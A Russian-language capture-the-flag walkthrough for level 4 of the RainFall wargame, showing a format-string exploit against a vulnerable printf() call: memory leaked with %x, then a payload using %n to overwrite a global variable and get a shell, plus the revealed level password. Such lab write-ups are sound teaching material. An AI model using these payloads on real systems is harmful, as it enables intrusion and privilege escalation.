Как и на уровне 3, мы можем найти исполняемый файл, ожидающий ввода, распечатать его и выйти после нажатия клавиши enter

Проанализировав его с помощью gdb, мы видим, что функция main() вызывает функцию с именем n(), которая также вызывает функцию с именем p(). Кроме того, двоичный файл почти такой же, как и уровень 3.

Main() вызывает только n(), не очень интересно, поэтому мы можем пропустить его.
Мы можем видеть вызов fgets() в n(), который защищает от атаки переполнения буфера.

   0x0804847a <+35>:    call   0x8048350 <fgets@plt>

После этого мы можем увидеть вызов функции printf() в p(), которая уязвима для эксплойта строки формата

   0x08048450 <+12>:    call   0x8048340 <printf@plt>

Затем программа сравнивает значение глобальной переменной mat 0x8049810 с 0x1025544 (16930116 в декабре).
Если сравнение вернет значение true, функция запустит оболочку с помощью вызова system().
Нам нужно манипулировать функцией printf(), чтобы изменить значение переменной по адресу 0x8049810.
Во-первых, как и на уровне 3, нам нужно распечатать память до тех пор, пока мы не достигнем адреса переменной, которую мы хотим изменить, затем измените содержимое переменной m.

#level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
#level4@RainFall:~$ cat /tmp/exploit | ./level4
#aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0
#level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit
#level4@RainFall:~$ cat /tmp/exploit | ./level4
#aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
#level4@RainFall:~$

Буфер aaaa находится на 12-й позиции (61616161)
Предыдущий метод не может работать, так как значение 16930116 в сравнении слишком длинное. Но с модификатором %d мы можем динамически указывать ширину поля (например, %16930116d).
Это будет единственное различие между этим уровнем и более старым.
Наконец, наша окончательная атака на строку формата будет выглядеть так :

    адрес m (4 байта)
    16930112 (меньше 4 байт из-за m) с модификатором %d + модификатор %n

#level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
#level4@RainFall:~$ cat /tmp/exploit | ./level4
                                                                                     -1208015184
#0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
#level4@RainFall:~$ su level5
